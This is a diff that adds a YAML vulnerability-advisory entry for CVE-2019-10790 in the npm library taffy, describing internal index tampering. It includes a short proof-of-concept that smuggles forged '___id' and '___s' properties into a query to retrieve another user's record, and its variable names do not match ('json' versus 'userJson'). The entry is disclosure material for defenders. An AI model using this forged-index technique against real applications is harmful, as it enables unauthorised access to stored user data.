@@ -1,0 +1,37 @@
+---
+- id: snykio:npm:taffy:546521
+  title: Internal Property Tampering
+  description: "[taffy][1] is a opensouce library that brings database features into\nyour
+    JavaScript applications.\n\nAffected versions of this package are vulnerable to
+    Internal Property\nTampering. `taffy` sets an internal index for each data item
+    in its DB.\nHowever, it is found that the internal index can be forged by adding\nadditional
+    properties into user-input. If index is found in the query,\n`taffyDB` will ignore
+    other query conditions and directly return the\nindexed data item. Moreover, the
+    internal index is in an\neasily-guessable format (e.g., `T000002R000001`). As
+    such, attackers can\nuse this vulnerability to access any data items in the DB.\n\n**Note:
+    This package has been deprecated by the author**\n\n### PoC by Feng Xiao (xiaofen9)
+    \  {#poc-by--feng-xiao-xiaofen9}\n\n    var TAFFY = require('taffy');\n    var
+    friends = TAFFY([\n            {\"id\":1,\"gender\":\"M\",\"username\":\"Smith\",\"password\":\"aaa\",\"status\":\"Active\"},\n
+    \           {\"id\":2,\"gender\":\"F\",\"username\":\"Ruth\",\"password\":\"bbb\",\"status\":\"Active\"},\n
+    \           {\"id\":3,\"gender\":\"M\",\"username\":\"Stevenson\",\"password\":\"ccc\",\"status\":\"Active\"},\n
+    \           {\"id\":4,\"gender\":\"F\",\"username\":\"Gill\",\"password\":\"ddd\",\"status\":\"Active\"}\n
+    \   ]);\n    \n    var json = {username:\"Smith\", \"password\":\"123\", \"___id\":\"T000002R000002\",
+    \"___s\":true};\n    var item1 = friends(userJson);\n    console.log(item1.first());\n\n\n\n[1]:
+    https://www.npmjs.com/package/taffy\n"
+  affected_package: taffy
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2019-10790
+  cwe:
+  - CWE-642
+  disclosed_date: 2020-02-05
+  created_date: 2020-02-05
+  last_modified_date: 2020-02-05
+  credit:
+  - Feng Xiao (xiaofen9)
+  references:
+  - https://www.npmjs.com/package/taffy
+  source_url: https://snyk.io/vuln/SNYK-JS-TAFFY-546521
